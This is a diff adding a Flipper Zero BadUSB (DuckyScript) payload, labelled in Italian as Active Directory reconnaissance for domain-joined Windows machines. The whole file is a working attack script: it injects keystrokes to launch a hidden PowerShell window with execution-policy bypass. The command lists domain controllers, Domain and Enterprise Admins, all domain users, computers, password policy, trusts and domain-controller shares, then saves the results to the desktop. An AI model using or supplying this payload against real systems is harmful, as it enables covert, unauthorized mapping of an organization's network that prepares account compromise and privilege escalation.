@@ -1,0 +1,18 @@
+REM ============================================================
+REM Title:    Active Directory Reconnaissance
+REM Target:   Windows 10/11 (domain-joined)
+REM Author:   FlipperZero-guide
+REM Category: Recon
+REM Privs:    Domain User (no admin)
+REM Layout:   IT
+REM Time:     ~12 secondi
+REM Detect:   Medio - query LDAP possono generare alert
+REM Desc:     Enumera domain controller, utenti, gruppi,
+REM           computer, GPO, trust, password policy
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "$o=[Environment]::GetFolderPath('Desktop')+'\ad_recon.txt';'=== AD RECON ===' | Out-File $o;'Date: '+(Get-Date) | Out-File $o -Append;'Domain: '+$env:USERDNSDOMAIN | Out-File $o -Append;'`n=== DOMAIN CONTROLLERS ===' | Out-File $o -Append;nltest /dclist:$env:USERDNSDOMAIN 2>&1 | Out-File $o -Append;'`n=== CURRENT USER GROUPS ===' | Out-File $o -Append;whoami /groups | Out-File $o -Append;'`n=== DOMAIN ADMINS ===' | Out-File $o -Append;net group 'Domain Admins' /domain 2>&1 | Out-File $o -Append;'`n=== ENTERPRISE ADMINS ===' | Out-File $o -Append;net group 'Enterprise Admins' /domain 2>&1 | Out-File $o -Append;'`n=== ALL DOMAIN USERS ===' | Out-File $o -Append;net user /domain 2>&1 | Out-File $o -Append;'`n=== DOMAIN COMPUTERS ===' | Out-File $o -Append;net group 'Domain Computers' /domain 2>&1 | Out-File $o -Append;'`n=== PASSWORD POLICY ===' | Out-File $o -Append;net accounts /domain 2>&1 | Out-File $o -Append;'`n=== TRUST RELATIONSHIPS ===' | Out-File $o -Append;nltest /domain_trusts 2>&1 | Out-File $o -Append;'`n=== SHARES ON DC ===' | Out-File $o -Append;net view \\\\$env:LOGONSERVER /all 2>&1 | Out-File $o -Append"
+ENTER
